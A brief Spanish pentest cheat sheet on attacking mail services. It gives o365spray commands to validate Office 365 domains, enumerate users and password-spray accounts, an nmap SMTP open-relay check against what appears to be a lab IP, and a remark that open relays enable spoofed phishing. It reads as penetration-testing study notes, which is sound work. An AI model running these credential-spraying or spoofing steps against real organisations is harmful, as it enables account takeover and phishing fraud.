Enumerar un Usuario

Enumerar Servidor SMTP en la Nube

GitHub o365spray para Microsoft Office 365

Validar si el dominio usa Office 365

python3 o365spray.py --validate --domain <domain.xyz>

Identificar nombres de usuarios

python3 o365spray.py --enum -U <users.txt> --domain <domain.xyz>

Si los servicios en la nube admiten los protocolos SMTP, POP3 o IMAP4, podríamos intentar rociar contraseñas, pero estas suelen estar bloqueadas.

Fuerza bruta sobre lista usuarios

python3 o365spray.py --spray -U <usersfound.txt> -p <'March2022!'> --count 1 --lockout 1 --domain <domain.xyz>

Herramientas MailSniper también para Microsoft Office 365 o CredKing para Gmail

Open Relay

Podemos aprovechar esto para realizar phishing enviando correos electrónicos como usuarios inexistentes o suplantando el correo electrónico de otra persona

Verificar si se permite open-relay

nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
# smtp-open-relay: Server is an open relay (14/16 tests)

A continuación, podemos utilizar cualquier cliente de correo para conectarnos al servidor de correo y enviar nuestro correo electrónico.
